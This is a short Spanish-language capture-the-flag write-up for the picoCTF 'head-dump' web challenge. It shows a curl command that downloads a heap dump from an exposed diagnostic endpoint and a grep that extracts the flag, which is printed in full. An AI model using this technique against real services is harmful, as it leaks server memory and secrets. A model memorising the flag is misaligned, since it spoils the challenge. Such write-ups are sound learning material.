# head-dump

## Descripcion
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.The website is running [picoCTF News](http://verbal-sleep.picoctf.net:51266/).
## Solucion
Al ingresar al sitio WEB exploramos los distintos artículos, hasta que nos encontramos con el articulo _[#API Documentation](http://verbal-sleep.picoctf.net:56939/api-docs)_ que nos lleva a la documentación de API endpoints del sitio.

Entre todos estos, encontramos uno de diagnostico de memoria llamado igual que el problema, por tanto lo usaremos.

Nos da como respuesta un documento a descargar mediante la consola, este archivo lo guardaré con nombre heapdump.

```shell
┌──(xrengariox㉿PC)-[~]
└─$ curl -X 'GET' 'http://verbal-sleep.picoctf.net:51266/heapdump/' -H 'accept: */*' > heapdump 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8834k  100 8834k    0     0  1676k      0  0:00:05  0:00:05 --:--:-- 2138k
```

Y luego vemos el contenido del archivo y filtramos con grep:
```sh
┌──(xrengariox㉿PC)-[~]
└─$ cato heapdump|grep 'picoCTF{'
picoCTF{Pat!3nt_15_Th3_K3y_439bb394}
```

Y asi obtenemos la flag:
```flag
picoCTF{Pat!3nt_15_Th3_K3y_439bb394}
```
## Notas adicionales

## Referencias
